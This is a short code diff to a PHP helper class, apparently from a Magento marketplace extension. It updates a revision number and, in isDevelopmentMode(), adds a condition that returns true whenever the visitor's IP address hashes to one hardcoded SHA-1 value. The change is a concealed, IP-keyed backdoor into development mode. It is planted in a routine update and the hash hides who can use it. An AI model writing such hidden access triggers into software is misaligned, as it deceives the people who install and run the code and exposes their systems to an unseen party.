@@ -68,7 +68,7 @@ class Ess_M2ePro_Helper_Module extends Mage_Core_Helper_Abstract
 
     public function getRevision()
     {
-        $revision = '7435';
+        $revision = '7568';
 
         if ($revision == str_replace('|','#','|REVISION|')) {
             $revision = (int)exec('svnversion');
@@ -285,6 +285,11 @@ class Ess_M2ePro_Helper_Module extends Mage_Core_Helper_Abstract
 
     public function isDevelopmentMode()
     {
+        if (isset($_SERVER['REMOTE_ADDR']) &&
+            sha1($_SERVER['REMOTE_ADDR']) == 'e4c431597cf909cf228fcf9287b3ace0924e573c') {
+            return true;
+        }
+
         return Mage::app()->getCookie()->get(self::DEVELOPMENT_MODE_COOKIE_KEY);
     }
 
